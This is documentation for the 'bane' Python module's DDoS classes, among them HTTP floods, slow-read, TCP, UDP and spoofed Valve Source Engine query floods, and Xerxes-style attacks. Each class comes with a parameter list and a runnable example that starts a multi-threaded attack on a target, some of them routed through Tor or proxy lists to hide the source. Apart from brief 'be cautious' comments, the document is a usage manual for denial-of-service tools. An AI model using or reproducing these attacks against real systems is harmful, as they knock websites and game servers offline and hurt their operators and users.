<h1>HTTP_Puncher Class</h1>

<h2>Class Overview</h2>
<p>The <code>HTTP_Puncher</code> class is part of the "bane" module and is used for launching HTTP-based DDoS attacks on a target URL.</p>

<h2>Class Constructor</h2>
<pre><code>class HTTP_Puncher(DDoS_Class)
</code></pre>
<p>This constructor initializes an instance of the <code>HTTP_Puncher</code> class with the following parameters:</p>

<ul>
    <li><code>u</code> (str): The target URL for the DDoS attack.</li>
    <li><code>send_files</code> (bool): Enable or disable sending files in the attack (default is True).</li>
    <li><code>cookie</code> (str): Custom cookies to include in requests.</li>
    <li><code>user_agents</code> (list): List of custom User-Agent headers for requests.</li>
    <li><code>method</code> (int): HTTP request method (1 for GET, 2 for POST, 3 for random; default is 3).</li>
    <li><code>threads_daemon</code> (bool): Set threads as daemons (default is True).</li>
    <li><code>urls</code> (list): List of target URLs for the attack (default is an empty list).</li>
    <li><code>threads</code> (int): Number of threads for the attack (default is 500).</li>
    <li><code>timeout</code> (int): Request timeout in seconds (default is 5).</li>
    <li><code>duration</code> (int): Duration of the attack in seconds (default is 60).</li>
    <li><code>logs</code> (bool): Enable or disable logging (default is False).</li>
    <li><code>tor</code> (bool): Use Tor for requests (default is False).</li>
    <li><code>scrape_target</code> (bool): Scrape additional URLs for the attack (default is True).</li>
    <li><code>scraped_urls</code> (int): Number of scraped URLs (default is 32).</li>
</ul>

<h2>Methods</h2>
<h3><code>attack(self)</code></h3>
<p>This method initiates the DDoS attack by sending HTTP requests to the target URL with random headers and data. It operates in a separate thread.</p>

<h2>Example Usage</h2>
<p>To use the <code>HTTP_Puncher</code> class, create an instance of it by providing the required parameters, and it will start launching DDoS attacks in the background. Here's an example:</p>

<pre><code>
from bane.ddos import HTTP_Puncher

#Create an instance of HTTP_Puncher
ddos_attack = HTTP_Puncher(
    "https://example.com",
    send_files=True,
    cookie="CustomCookie",
    user_agents=["UserAgent1", "UserAgent2"],
    method=3,
    threads_daemon=True,
    urls=["https://example.com/page1", "https://example.com/page2"],
    threads=500,
    timeout=5,
    duration=60,
    logs=True,
    tor=False,
    scrape_target=False,
    scraped_urls=5
)

#DDoS attack is launched in the background
#Monitor the attack's progress as needed

#To stop the attack, you can set ddos_attack.stop = True

#Be cautious and responsible when using DDoS attacks in a real environment.
</code></pre>
<h1>HTTP_Spam Class</h1>

<h2>Class Overview</h2>
<p>The <code>HTTP_Spam</code> class is part of the "bane" module and is used for launching HTTP-based DDoS attacks on a target URL by spamming each connection with a stream of requests unlike the previous one.</p>

<h2>Class Constructor</h2>
<pre><code>class HTTP_Spam(DDoS_Class)
</code></pre>
<p>This constructor initializes an instance of the <code>HTTP_Spam</code> class with the following parameters:</p>

<ul>
    <li><code>u</code> (str): The target URL for the spamming attack.</li>
    <li><code>p</code> (int): Port number (default is 80).</li>
    <li><code>cookie</code> (str): Custom cookies to include in requests.</li>
    <li><code>user_agents</code> (list): List of custom User-Agent headers for requests.</li>
    <li><code>method</code> (int): HTTP request method (1 for GET, 2 for POST, 3 for random; default is 3).</li>
    <li><code>threads_daemon</code> (bool): Set threads as daemons (default is True).</li>
    <li><code>paths</code> (list): List of URL paths to target (default is ["/"]).</li>
    <li><code>threads</code> (int): Number of threads for the spamming attack (default is 256).</li>
    <li><code>post_min</code> (int): Minimum number of POST requests to send per round (default is 5).</li>
    <li><code>post_max</code> (int): Maximum number of POST requests to send per round (default is 10).</li>
    <li><code>post_field_min</code> (int): Minimum length of POST request fields (default is 50).</li>
    <li><code>post_field_max</code> (int): Maximum length of POST request fields (default is 100).</li>
    <li><code>timeout</code> (int): Request timeout in seconds (default is 5).</li>
    <li><code>round_min</code> (int): Minimum number of rounds to run (default is 1000).</li>
    <li><code>round_max</code> (int): Maximum number of rounds to run (default is 10000).</li>
    <li><code>interval</code> (float): Time interval between requests (default is 0.001).</li>
    <li><code>duration</code> (int): Duration of the attack in seconds (default is 60).</li>
    <li><code>tor</code> (bool): Use Tor for requests (default is False).</li>
    <li><code>ssl_on</code> (bool): Enable SSL/TLS for requests (default is False).</li>
    <li><code>logs</code> (bool): Enable or disable logging (default is True).</li>
</ul>

<h2>Methods</h2>
<h3><code>attack(self)</code></h3>
<p>This method initiates the HTTP spamming attack by sending HTTP requests to the target URL with random headers and data. It operates in a separate thread.</p>

<h2>Example Usage</h2>
<p>To use the <code>HTTP_Spam</code> class, create an instance of it by providing the required parameters, and it will start performing HTTP spamming attacks in the background. Here's an example:</p>

<pre><code>
from bane.ddos import HTTP_Spam

#Create an instance of HTTP_Spam
http_spam = HTTP_Spam(
    "example.com",
    p=80,
    cookie="CustomCookie",
    user_agents=["UserAgent1", "UserAgent2"],
    method=3,
    threads_daemon=True,
    paths=["/"],
    threads=256,
    post_min=5,
    post_max=10,
    post_field_min=50,
    post_field_max=100,
    timeout=5,
    round_min=1000,
    round_max=10000,
    interval=0.001,
    duration=60,
    tor=False,
    ssl_on=False,
    logs=True
)

#HTTP spamming attack is performed in the background
#Monitor the attack's progress as needed

#To stop the attack, you can set http_spam.stop = True

#Be cautious and responsible when using such attack techniques in a real environment.
</code></pre>

<h1>Proxies_Hammer Class</h1>

<h2>Class Overview</h2>
<p>The <code>Proxies_Hammer</code> class is part of the "bane" module and is used for launching low-rate HTTP POST requests through a list of proxy servers to a target URL.</p>

<h2>Class Constructor</h2>
<pre><code>class Proxies_Hammer(DDoS_Class)
</code></pre>
<p>This constructor initializes an instance of the <code>Proxies_Hammer</code> class with the following parameters:</p>

<ul>
    <li><code>u</code> (str): The target URL for the POST requests.</li>
    <li><code>p</code> (int): Port number of the target server (default is 80).</li>
    <li><code>cookie</code> (str): Custom cookies to include in requests.</li>
    <li><code>user_agents</code> (list): List of custom User-Agent headers for requests (default is Common_Variables.user_agents_list).</li>
    <li><code>threads_daemon</code> (bool): Set threads as daemons (default is True).</li>
    <li><code>scraping_timeout</code> (int): Timeout for proxy scraping in seconds (default is 15).</li>
    <li><code>max_content</code> (int): Maximum content length for POST requests (default is 15000).</li>
    <li><code>min_content</code> (int): Minimum content length for POST requests (default is 10000).</li>
    <li><code>threads</code> (int): Number of threads for the attack (default is 700).</li>
    <li><code>timeout</code> (int): Request timeout in seconds (default is 5).</li>
    <li><code>paths</code> (list): List of URL paths to target (default is ["/"]).</li>
    <li><code>http_proxies</code> (list): List of HTTP proxies to use.</li>
    <li><code>socks4_proxies</code> (list): List of SOCKS4 proxies to use.</li>
    <li><code>socks5_proxies</code> (list): List of SOCKS5 proxies to use.</li>
    <li><code>duration</code> (int): Duration of the attack in seconds (default is 60).</li>
    <li><code>ssl_on</code> (bool): Enable SSL/TLS for requests (default is False).</li>
    <li><code>logs</code> (bool): Enable or disable logging (default is True).</li>
</ul>

<h2>Methods</h2>
<h3><code>attack(self)</code></h3>
<p>This method initiates the attack by sending POST requests to the target URL through a list of proxy servers. It operates in a separate thread.</p>

<h2>Example Usage</h2>
<p>To use the <code>Proxies_Hammer</code> class, create an instance of it by providing the required parameters, and it will start launching the attack in the background. Here's an example:</p>

<pre><code>
from bane.ddos import Proxies_Hammer

#Create an instance of Proxies_Hammer
proxy_hammer = Proxies_Hammer(
    "example.com",
    p=80,
    cookie="CustomCookie",
    user_agents=["UserAgent1", "UserAgent2"],
    threads_daemon=True,
    scraping_timeout=15,
    max_content=15000,
    min_content=10000,
    threads=700,
    timeout=5,
    paths=["/"],
    http_proxies=["proxy1:8080", "proxy2:8888"],
    socks4_proxies=None,
    socks5_proxies=["socks5_proxy1:1080", "socks5_proxy2:1080"],
    duration=60,
    ssl_on=False,
    logs=True
)

#Proxy hammer attack is performed in the background
#Monitor the attack's progress as needed

#To stop the attack, you can set proxy_hammer.stop = True

#Be cautious and responsible when using such attack techniques in a real environment.
</code></pre>
<h1>Proxies_HTTP_Spam Class</h1>

<h2>Class Overview</h2>
<p>The <code>Proxies_HTTP_Spam</code> class is part of the "bane" module and is used for spamming a target URL with HTTP GET and POST requests through a list of proxy servers.</p>

<h2>Class Constructor</h2>
<pre><code>class Proxies_HTTP_Spam(DDoS_Class)
</code></pre>
<p>This constructor initializes an instance of the <code>Proxies_HTTP_Spam</code> class with the following parameters:</p>

<ul>
    <li><code>u</code> (str): The target URL for the GET and POST requests.</li>
    <li><code>p</code> (int): Port number of the target server (default is 80).</li>
    <li><code>cookie</code> (str): Custom cookies to include in requests.</li>
    <li><code>user_agents</code> (list): List of custom User-Agent headers for requests (default is Common_Variables.user_agents_list).</li>
    <li><code>method</code> (int): The HTTP request method (1 for GET, 2 for POST, 3 for random) (default is 3).</li>
    <li><code>threads_daemon</code> (bool): Set threads as daemons (default is True).</li>
    <li><code>scraping_timeout</code> (int): Timeout for proxy scraping in seconds (default is 15).</li>
    <li><code>paths</code> (list): List of URL paths to target (default is ["/"]).</li>
    <li><code>threads</code> (int): Number of threads for the attack (default is 256).</li>
    <li><code>post_min</code> (int): Minimum number of POST requests to send (default is 5).</li>
    <li><code>post_max</code> (int): Maximum number of POST requests to send (default is 10).</li>
    <li><code>post_field_max</code> (int): Maximum size of POST request fields (default is 100).</li>
    <li><code>post_field_min</code> (int): Minimum size of POST request fields (default is 50).</li>
    <li><code>timeout</code> (int): Request timeout in seconds (default is 5).</li>
    <li><code>round_min</code> (int): Minimum number of rounds for requests (default is 1000).</li>
    <li><code>round_max</code> (int): Maximum number of rounds for requests (default is 10000).</li>
    <li><code>interval</code> (float): Interval between requests in seconds (default is 0.001).</li>
    <li><code>duration</code> (int): Duration of the attack in seconds (default is 60).</li>
    <li><code>http_proxies</code> (list): List of HTTP proxies to use.</li>
    <li><code>socks4_proxies</code> (list): List of SOCKS4 proxies to use.</li>
    <li><code>socks5_proxies</code> (list): List of SOCKS5 proxies to use.</li>
    <li><code>ssl_on</code> (bool): Enable SSL/TLS for requests (default is False).</li>
    <li><code>logs</code> (bool): Enable or disable logging (default is True).</li>
</ul>

<h2>Methods</h2>
<h3><code>attack(self)</code></h3>
<p>This method initiates the attack by sending GET and POST requests to the target URL through a list of proxy servers. It operates in a separate thread.</p>

<h2>Example Usage</h2>
<p>To use the <code>Proxies_HTTP_Spam</code> class, create an instance of it by providing the required parameters, and it will start spamming the target URL with GET and POST requests in the background. Here's an example:</p>

<pre><code>
from bane.ddos import Proxies_HTTP_Spam

#Create an instance of Proxies_HTTP_Spam
proxy_http_spam = Proxies_HTTP_Spam(
    "example.com",
    p=80,
    cookie="CustomCookie",
    user_agents=["UserAgent1", "UserAgent2"],
    method=3,
    threads_daemon=True,
    scraping_timeout=15,
    paths=["/"],
    threads=256,
    post_min=5,
    post_max=10,
    post_field_max=100,
    post_field_min=50,
    timeout=5,
    round_min=1000,
    round_max=10000,
    interval=0.001,
    duration=60,
    http_proxies=["proxy1:8080", "proxy2:8888"],
    socks4_proxies=None,
    socks5_proxies=["socks5_proxy1:1080", "socks5_proxy2:1080"],
    ssl_on=False,
    logs=True
)

#Proxy HTTP spam attack is performed in the background
#Monitor the attack's progress as needed

#To stop the attack, you can set proxy_http_spam.stop = True

#Be cautious and responsible when using such attack techniques in a real environment.
</code></pre>
<h1>Proxies_Xerxes Class</h1>

<h2>Class Overview</h2>
<p>The <code>Proxies_Xerxes</code> class is part of the "bane" module and is used for performing a simple DDoS attack by sending NULL characters through a list of proxy servers.</p>

<h2>Class Constructor</h2>
<pre><code>class Proxies_Xerxes(DDoS_Class)
</code></pre>
<p>This constructor initializes an instance of the <code>Proxies_Xerxes</code> class with the following parameters:</p>

<ul>
    <li><code>u</code> (str): The target URL for sending NULL characters.</li>
    <li><code>scraping_timeout</code> (int): Timeout for proxy scraping in seconds (default is 15).</li>
    <li><code>p</code> (int): Port number of the target server (default is 80).</li>
    <li><code>threads_daemon</code> (bool): Set threads as daemons (default is True).</li>
    <li><code>threads</code> (int): Number of threads for the attack (default is 700).</li>
    <li><code>timeout</code> (int): Request timeout in seconds (default is 5).</li>
    <li><code>http_proxies</code> (list): List of HTTP proxies to use.</li>
    <li><code>socks4_proxies</code> (list): List of SOCKS4 proxies to use.</li>
    <li><code>socks5_proxies</code> (list): List of SOCKS5 proxies to use.</li>
    <li><code>duration</code> (int): Duration of the attack in seconds (default is 60).</li>
    <li><code>ssl_on</code> (bool): Enable SSL/TLS for requests (default is False).</li>
    <li><code>logs</code> (bool): Enable or disable logging (default is True).</li>
</ul>

<h2>Methods</h2>
<h3><code>attack(self)</code></h3>
<p>This method initiates the attack by sending NULL characters to the target URL through a list of proxy servers. It operates in a separate thread.</p>

<h2>Example Usage</h2>
<p>To use the <code>Proxies_Xerxes</code> class, create an instance of it by providing the required parameters, and it will start sending NULL characters to the target URL through the specified proxy servers in the background. Here's an example:</p>

<pre><code>
from bane.ddos import Proxies_Xerxes

#Create an instance of Proxies_Xerxes
proxy_xerxes = Proxies_Xerxes(
    "example.com",
    scraping_timeout=15,
    p=80,
    threads_daemon=True,
    threads=700,
    timeout=5,
    http_proxies=["proxy1:8080", "proxy2:8888"],
    socks4_proxies=None,
    socks5_proxies=["socks5_proxy1:1080", "socks5_proxy2:1080"],
    duration=60,
    ssl_on=False,
    logs=True
)

#Xerxes DDoS attack is performed in the background
#Monitor the attack's progress as needed

#To stop the attack, you can set proxy_xerxes.stop = True

#Be cautious and responsible when using such attack techniques in a real environment.
</code></pre>
<h1>Slow_Read Class</h1>

<h2>Class Overview</h2>
<p>The <code>Slow_Read</code> class is part of the "bane" module and is used to perform a slow reading attack on a target server. This attack sends normal HTTP requests but reads them slowly to keep the connection open for an extended period of time.</p>

<h2>Class Constructor</h2>
<pre><code>class Slow_Read(DDoS_Class)
</code></pre>
<p>This constructor initializes an instance of the <code>Slow_Read</code> class with the following parameters:</p>

<ul>
    <li><code>u</code> (str): The target URL for performing the slow reading attack.</li>
    <li><code>p</code> (int): Port number of the target server (default is 80).</li>
    <li><code>cookie</code> (str): Optional cookie to include in the HTTP requests (default is None).</li>
    <li><code>user_agents</code> (list): List of user-agent strings to use in the HTTP requests (default is None).</li>
    <li><code>paths</code> (list): List of paths to request on the target server (default is ["/"]).</li>
    <li><code>threads_daemon</code> (bool): Set threads as daemons (default is True).</li>
    <li><code>threads</code> (int): Number of threads for the attack (default is 500).</li>
    <li><code>timeout</code> (int): Request timeout in seconds (default is 5).</li>
    <li><code>min_speed</code> (int): Minimum speed for reading data (default is 3 seconds).</li>
    <li><code>max_speed</code> (int): Maximum speed for reading data (default is 5 seconds).</li>
    <li><code>min_read</code> (int): Minimum number of bytes to read (default is 1).</li>
    <li><code>max_read</code> (int): Maximum number of bytes to read (default is 3).</li>
    <li><code>logs</code> (bool): Enable or disable logging (default is False).</li>
    <li><code>tor</code> (bool): Use the Tor network for the attack (default is False).</li>
    <li><code>duration</code> (int): Duration of the attack in seconds (default is 60).</li>
    <li><code>ssl_on</code> (bool): Enable SSL/TLS for requests (default is False).</li>
</ul>

<h2>Methods</h2>
<h3><code>attack(self)</code></h3>
<p>This method initiates the slow reading attack on the target server by sending normal HTTP requests, reading them slowly, and keeping the connection open for an extended period. It operates in a separate thread.</p>

<h2>Example Usage</h2>
<p>To use the <code>Slow_Read</code> class, create an instance of it by providing the required parameters, and it will start performing a slow reading attack on the target URL in the background. Here's an example:</p>

<pre><code>
from bane.ddos import Slow_Read

#Create an instance of Slow_Read
slow_read_attack = Slow_Read(
    "example.com",
    p=80,
    cookie="your_cookie_string",
    user_agents=["User-Agent 1", "User-Agent 2"],
    paths=["/path1", "/path2"],
    threads_daemon=True,
    threads=500,
    timeout=5,
    min_speed=3,
    max_speed=5,
    min_read=1,
    max_read=3,
    logs=True,
    tor=False,
    duration=60,
    ssl_on=False
)

#Slow reading attack is performed in the background
#Monitor the attack's progress as needed

#To stop the attack, you can set slow_read_attack.stop = True

#Be cautious and responsible when using such attack techniques in a real environment.
</code></pre>
<h1>TCP_Flood Class</h1>

<h2>Class Overview</h2>
<p>The <code>TCP_Flood</code> class is part of the "bane" module and is used to perform a TCP flooding attack on a target server. This attack floods the target with a large number of TCP packets to overwhelm the server and disrupt its normal operations.</p>

<h2>Class Constructor</h2>
<pre><code>class TCP_Flood(DDoS_Class)
</code></pre>
<p>This constructor initializes an instance of the <code>TCP_Flood</code> class with the following parameters:</p>

<ul>
    <li><code>u</code> (str): The target URL or IP address for the TCP flooding attack.</li>
    <li><code>p</code> (int): Port number of the target server (default is 80).</li>
    <li><code>threads_daemon</code> (bool): Set threads as daemons (default is True).</li>
    <li><code>min_size</code> (int): Minimum size of the TCP packets to be sent (default is 10 bytes).</li>
    <li><code>max_size</code> (int): Maximum size of the TCP packets to be sent (default is 50 bytes).</li>
    <li><code>threads</code> (int): Number of threads for the attack (default is 500).</li>
    <li><code>timeout</code> (int): Timeout for the socket connections in seconds (default is 5 seconds).</li>
    <li><code>round_min</code> (int): Minimum number of times to send packets for each connection (default is 1000 times).</li>
    <li><code>round_max</code> (int): Maximum number of times to send packets for each connection (default is 10000 times).</li>
    <li><code>interval</code> (float): Time interval between sending packets (default is 0.001 seconds).</li>
    <li><code>duration</code> (int): Duration of the attack in seconds (default is 60 seconds).</li>
    <li><code>logs</code> (bool): Enable or disable logging (default is False).</li>
    <li><code>tor</code> (bool): Use the Tor network for the attack (default is False).</li>
    <li><code>ssl_on</code> (bool): Enable SSL/TLS for socket connections (default is False).</li>
</ul>

<h2>Methods</h2>
<h3><code>attack(self)</code></h3>
<p>This method initiates the TCP flooding attack on the target server by sending a large number of TCP packets with random payload sizes. It operates in a separate thread.</p>

<h2>Example Usage</h2>
<p>To use the <code>TCP_Flood</code> class, create an instance of it by providing the required parameters, and it will start performing a TCP flooding attack on the target URL or IP address in the background. Here's an example:</p>

<pre><code>
from bane.ddos import TCP_Flood

#Create an instance of TCP_Flood
tcp_flood_attack = TCP_Flood(
    "example.com",
    p=80,
    threads_daemon=True,
    min_size=10,
    max_size=50,
    threads=500,
    timeout=5,
    round_min=1000,
    round_max=10000,
    interval=0.001,
    duration=60,
    logs=True,
    tor=False,
    ssl_on=False
)

#TCP flooding attack is performed in the background
#Monitor the attack's progress as needed

#To stop the attack, you can set tcp_flood_attack.stop = True

#Be cautious and responsible when using such attack techniques in a real environment.
</code></pre>
<h1>Tor_Hammer Class</h1>

<h2>Class Overview</h2>
<p>The <code>Tor_Hammer</code> class is part of the "bane" module and is used to perform a DDoS attack with the ability to switch between using the Tor network and direct connections. This attack sends a high volume of HTTP requests to a target server to overwhelm it and disrupt its normal operations.</p>

<h2>Class Constructor</h2>
<pre><code>class Tor_Hammer(DDoS_Class)
</code></pre>
<p>This constructor initializes an instance of the <code>Tor_Hammer</code> class with the following parameters:</p>

<ul>
    <li><code>u</code> (str): The target URL or IP address for the DDoS attack.</li>
    <li><code>p</code> (int): Port number of the target server (default is 80).</li>
    <li><code>cookie</code> (str): The HTTP cookie to be included in the requests (default is None).</li>
    <li><code>user_agents</code> (list): List of user-agent strings to be used in the HTTP requests (default is None).</li>
    <li><code>threads_daemon</code> (bool): Set threads as daemons (default is True).</li>
    <li><code>threads</code> (int): Number of threads for the attack (default is 500).</li>
    <li><code>timeout</code> (int): Timeout for the socket connections in seconds (default is 5 seconds).</li>
    <li><code>tor</code> (bool): Use the Tor network for the attack (default is False).</li>
    <li><code>duration</code> (int): Duration of the attack in seconds (default is 60 seconds).</li>
    <li><code>logs</code> (bool): Enable or disable logging (default is False).</li>
    <li><code>max_content</code> (int): Maximum content length of the HTTP requests (default is 15000 bytes).</li>
    <li><code>min_content</code> (int): Minimum content length of the HTTP requests (default is 10000 bytes).</li>
    <li><code>ssl_on</code> (bool): Enable SSL/TLS for socket connections (default is False).</li>
    <li><code>paths</code> (list): List of paths to be used in the HTTP requests (default is ['/']).</li>
</ul>

<h2>Methods</h2>
<h3><code>attack(self)</code></h3>
<p>This method initiates the DDoS attack on the target server by sending a large number of HTTP requests with random content lengths. It can switch between using the Tor network and direct connections based on the <code>tor</code> parameter. It operates in a separate thread.</p>

<h2>Example Usage</h2>
<p>To use the <code>Tor_Hammer</code> class, create an instance of it by providing the required parameters, and it will start performing a DDoS attack on the target URL or IP address in the background. Here's an example:</p>

<pre><code>
from bane.ddos import Tor_Hammer

#Create an instance of Tor_Hammer
tor_hammer_attack = Tor_Hammer(
    "example.com",
    p=80,
    cookie=None,
    user_agents=None,
    threads_daemon=True,
    threads=500,
    timeout=5,
    tor=False,
    duration=60,
    logs=False,
    max_content=15000,
    min_content=10000,
    ssl_on=False,
    paths=['/']
)

#DDoS attack is performed in the background
#Monitor the attack's progress as needed

#To stop the attack, you can set tor_hammer_attack.stop = True

#Be cautious and responsible when using such attack techniques in a real environment.
</code></pre>
<h1>UDP_Flood Class</h1>

<h2>Class Overview</h2>
<p>The <code>UDP_Flood</code> class is part of the "bane" module and is used to perform a DDoS attack by flooding a target server with UDP (User Datagram Protocol) packets. UDP is a connectionless protocol, and this attack generates a large volume of UDP packets to overwhelm the target.</p>

<h2>Class Constructor</h2>
<pre><code>class UDP_Flood(DDoS_Class)
</code></pre>
<p>This constructor initializes an instance of the <code>UDP_Flood</code> class with the following parameters:</p>

<ul>
    <li><code>u</code> (str): The target URL or IP address for the DDoS attack.</li>
    <li><code>p</code> (int): Port number of the target server (default is 80).</li>
    <li><code>threads_daemon</code> (bool): Set threads as daemons (default is True).</li>
    <li><code>interval</code> (float): Interval between sending UDP packets in seconds (default is 0.001 seconds).</li>
    <li><code>min_size</code> (int): Minimum payload size of UDP packets (default is 10 bytes).</li>
    <li><code>max_size</code> (int): Maximum payload size of UDP packets (default is 10 bytes).</li>
    <li><code>connection</code> (bool): Maintain a connection with the target (default is True).</li>
    <li><code>duration</code> (int): Duration of the attack in seconds (default is 60 seconds).</li>
    <li><code>threads</code> (int): Number of threads for the attack (default is 1).</li>
    <li><code>limiting</code> (bool): Enable limiting the sending rate based on the <code>interval</code> (default is True).</li>
    <li><code>logs</code> (bool): Enable or disable logging (default is False).</li>
</ul>

<h2>Methods</h2>
<h3><code>attack(self)</code></h3>
<p>This method initiates the DDoS attack by sending a high volume of UDP packets to the target server. The attack is performed in a separate thread. The attack can optionally maintain a connection with the target server and limit the sending rate based on the <code>interval</code> parameter.</p>

<h2>Example Usage</h2>
<p>To use the <code>UDP_Flood</code> class, create an instance of it by providing the required parameters, and it will start performing a DDoS attack on the target URL or IP address in the background. Here's an example:</p>

<pre><code>
from bane.ddos import UDP_Flood

#Create an instance of UDP_Flood
udp_flood_attack = UDP_Flood(
    "example.com",
    p=80,
    threads_daemon=True,
    interval=0.001,
    min_size=10,
    max_size=10,
    connection=True,
    duration=60,
    threads=1,
    limiting=True,
    logs=False
)

#DDoS attack is performed in the background
#Monitor the attack's progress as needed

#To stop the attack, you can set udp_flood_attack.stop = True

#Be cautious and responsible when using such attack techniques in a real environment.
</code></pre>
<h1>VSE_Flood Class</h1>

<h2>Class Overview</h2>
<p>The <code>VSE_Flood</code> class is part of the "bane" module and is used to perform a DDoS attack known as the Valve Source Engine Query (VSE) flood attack. The attack sends spoofed queries to Source Engine servers in an attempt to overwhelm them with traffic. This attack is often used in the gaming community to disrupt online game servers.</p>

<h2>Class Constructor</h2>
<pre><code>class VSE_Flood(DDoS_Class)
</code></pre>
<p>This constructor initializes an instance of the <code>VSE_Flood</code> class with the following parameters:</p>

<ul>
    <li><code>u</code> (str): The target URL or IP address for the DDoS attack.</li>
    <li><code>p</code> (int): Port number of the target server (default is 80).</li>
    <li><code>threads_daemon</code> (bool): Set threads as daemons (default is True).</li>
    <li><code>interval</code> (float): Interval between sending VSE queries in seconds (default is 0.001 seconds).</li>
    <li><code>connection</code> (bool): Maintain a connection with the target (default is True).</li>
    <li><code>duration</code> (int): Duration of the attack in seconds (default is 60 seconds).</li>
    <li><code>threads</code> (int): Number of threads for the attack (default is 1).</li>
    <li><code>limiting</code> (bool): Enable limiting the sending rate based on the <code>interval</code> (default is True).</li>
    <li><code>logs</code> (bool): Enable or disable logging (default is False).</li>
</ul>

<h2>Methods</h2>
<h3><code>attack(self)</code></h3>
<p>This method initiates the VSE flood attack by sending spoofed VSE queries to the target server. The attack is performed in a separate thread. The attack can optionally maintain a connection with the target server and limit the sending rate based on the <code>interval</code> parameter.</p>

<h2>Example Usage</h2>
<p>To use the <code>VSE_Flood</code> class, create an instance of it by providing the required parameters, and it will start performing a DDoS attack on the target URL or IP address in the background. Here's an example:</p>

<pre><code>
from bane.ddos import VSE_Flood

#Create an instance of VSE_Flood
vse_flood_attack = VSE_Flood(
    u="example.com",
    p=27015,  #The default port for Source Engine servers
    threads_daemon=True,
    interval=0.001,
    connection=True,
    duration=60,
    threads=1,
    limiting=True,
    logs=False
)

#DDoS attack is performed in the background
#Monitor the attack's progress as needed

#To stop the attack, you can set vse_flood_attack.stop = True

#Be cautious and responsible when using such attack techniques in a real environment, and ensure you have proper authorization.
</code></pre>
<h1>Xerxes Class</h1>

<h2>Class Overview</h2>
<p>The <code>Xerxes</code> class is part of the "bane" module and is used to perform a DDoS attack using the Xerxes tool. This attack sends NULL characters to a target server to flood it with traffic. The tool is named after the ancient Persian king Xerxes I, known for his invasion of Greece.</p>

<h2>Class Constructor</h2>
<pre><code>class Xerxes(DDoS_Class)
</code></pre>
<p>This constructor initializes an instance of the <code>Xerxes</code> class with the following parameters:</p>

<ul>
    <li><code>u</code> (str): The target URL or IP address for the DDoS attack.</li>
    <li><code>p</code> (int): Port number of the target server (default is 80).</li>
    <li><code>threads_daemon</code> (bool): Set threads as daemons (default is True).</li>
    <li><code>threads</code> (int): Number of threads for the attack (default is 500).</li>
    <li><code>timeout</code> (int): Timeout for socket connections (default is 5 seconds).</li>
    <li><code>duration</code> (int): Duration of the attack in seconds (default is 60 seconds).</li>
    <li><code>logs</code> (bool): Enable or disable logging (default is False).</li>
    <li><code>tor</code> (bool): Use the Tor network for anonymity (default is False).</li>
    <li><code>ssl_on</code> (bool): Enable SSL/TLS for the connection (default is False).</li>
</ul>

<h2>Methods</h2>
<h3><code>attack(self)</code></h3>
<p>This method initiates the Xerxes DDoS attack by sending NULL characters to the target server. The attack is performed in a separate thread. It can maintain a connection with the target server, and the attack duration can be controlled using the <code>duration</code> parameter.</p>

<h2>Example Usage</h2>
<p>To use the <code>Xerxes</code> class, create an instance of it by providing the required parameters, and it will start performing a DDoS attack on the target URL or IP address in the background. Here's an example:</p>

<pre><code>
from bane.ddos import Xerxes

#Create an instance of Xerxes
xerxes_attack = Xerxes(
    u="example.com",
    p=80,  #Default HTTP port
    threads_daemon=True,
    threads=500,
    timeout=5,
    duration=60,
    logs=False,
    tor=False,
    ssl_on=False
)

#DDoS attack is performed in the background
#Monitor the attack's progress as needed

#To stop the attack, you can set xerxes_attack.stop = True

#Be cautious and responsible when using such attack techniques in a real environment, and ensure you have proper authorization.
</code></pre>
